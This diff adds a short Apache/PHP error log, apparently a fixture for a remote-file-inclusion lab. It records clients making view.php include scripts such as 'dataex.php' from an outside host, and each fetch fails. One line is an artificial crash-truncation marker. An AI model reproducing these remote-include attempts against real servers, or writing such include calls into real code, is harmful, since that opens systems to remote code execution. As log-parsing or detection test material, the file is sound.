@@ -1,0 +1,8 @@
+[Sun Jul 28 12:30:00 2024] [notice] Apache/2.2.15 (Unix) PHP/5.3.3 configured -- resuming normal operations
+[Sun Jul 28 12:49:44 2024] [error] [client 203.0.113.22] PHP Warning:  include(http://198.51.100.5/dataex.php) [<a href='function.include'>function.include</a>]: failed to open stream: HTTP request failed! HTTP/1.1 404 Undescribed\r\n in /var/www/html/rfi/view.php on line 3
+[Sun Jul 28 12:49:44 2024] [error] [client 203.0.113.22] PHP Warning:  include() [<a href='function.include'>function.include</a>]: Failed opening 'http://198.51.100.5/dataex.php' for inclusion (include_path='.:/usr/share/pear:/usr/share/php') in /var/www/html/rfi/view.php on line 3
+[Sun Jul 28 12:49:44 2024] [error] [client 203.0.113.22] PHP Notice:  Undefined variable: value in /var/www/html/rfi/view.php on line 4
+this line was cut in half by a crash
+[Sun Jul 28 13:06:02 2024] [error] [client 203.0.113.27] PHP Warning:  include(http://198.51.100.5/fail.php) [<a href='function.include'>function.include</a>]: failed to open stream: HTTP request failed! HTTP/1.1 404 Undescribed\r\n in /var/www/html/rfi/view.php on line 3
+[Sun Jul 28 13:06:02 2024] [error] [client 203.0.113.27] PHP Warning:  include() [<a href='function.include'>function.include</a>]: Failed opening 'http://198.51.100.5/fail.php' for inclusion (include_path='.:/usr/share/pear:/usr/share/php') in /var/www/html/rfi/view.php on line 3
+[Sun Jul 28 13:13:14 2024] [error] [client 203.0.113.22] File does not exist: /var/www/html/rfi/yessir2345.html2345.html
